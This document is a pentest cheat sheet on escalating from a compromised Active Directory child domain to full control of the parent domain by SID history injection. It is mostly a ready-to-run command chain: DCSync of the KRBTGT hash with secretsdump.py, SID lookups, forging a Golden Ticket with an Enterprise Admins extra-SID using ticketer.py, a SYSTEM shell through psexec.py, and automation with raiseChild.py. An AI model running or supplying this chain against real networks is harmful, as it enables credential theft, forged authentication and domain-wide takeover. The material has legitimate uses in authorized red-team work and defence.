# From Linux

## SID History Primer

The sidHistory attribute is used for migration purposes, allowing users to access resources in the original domain after migration. 
However, attackers can misuse it through SID history injection. 
By using Mimikatz, they can add an administrator account to the SID history attribute of a compromised account. 
When logging in with this account, all associated SIDs are added to the user's token, determining their access rights. 
If the SID of a Domain Admin account is added, the attacker gains DCSync and can create Golden Tickets or Kerberos ticket-granting tickets, 
enabling them to authenticate as any account in the chosen domain for further persistence.

To perform this attack after compromising a child domain, we need the following:

    The KRBTGT hash for the child domain
    The SID for the child domain
    The name of a target user in the child domain (does not need to exist!)
    The FQDN of the child domain.
    The SID of the Enterprise Admins group of the root domain.
    With this data collected, the attack can be performed with Mimikatz.

## Performing DCSync with secretsdump.py
Once we have complete control of the child domain, we can use secretsdump.py to DCSync and grab the NTLM hash for the KRBTGT account.
```bash
secretsdump.py child.mydomain.local/username@192.168.0.100 -just-dc-user CHILD/krbtgt
# this IP is the IP of the domain controller in the child domain
```
## Performing SID Brute Forcing using lookupsid.py
We can now use lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. 
```bash
lookupsid.py child.mydomain.local/username@192.168.0.100 | grep "Domain SID"
```
## Grabbing the Domain SID & Attaching to Enterprise Admin's RID
 Rerun the command, targeting the MYDOMAIN Domain Controller at 192.168.0.1 and grab the domain SID 
 ```bash
lookupsid.py child.mydomain.local/username@192.168.0.1 | grep -B12 "Enterprise Admins"
```
## Constructing a Golden Ticket using ticketer.py
Now we can forge the golden ticket
use ticketer.py from the Impacket toolkit to construct a Golden Ticket. 
This ticket will be valid to access resources in the child domain (specified by -domain-sid) and the parent domain (specified by -extra-sid).
```bash
ticketer.py -nthash 9d765b4871505cbe97411065964d5f -domain child.MYDOMAIN.LOCAL -domain-sid S-1-5-21-28061819-2893948-9872689 -extra-sid S-1-5-21-38439050-38817879-25463114-519 createdUser
```
## Setting the KRB5CCNAME Environment Variable
The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials. 
Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.
```bash
export KRB5CCNAME=hacker.ccache 
```
## Getting a SYSTEM shell using Impacket's psexec.py
```bash
psexec.py CHILD.MYDOMAIN.LOCAL/createdUser@computersname.mydomain.local -k -no-pass -target-ip 192.168.0.1
```
## Performing the Attack with raiseChild.py
Impacket also has the tool raiseChild.py, which will automate escalating from child to parent domain.
```bash
raiseChild.py -target-exec 192.168.0.1 CHILD.MYDOMAIN.LOCAL/username
```











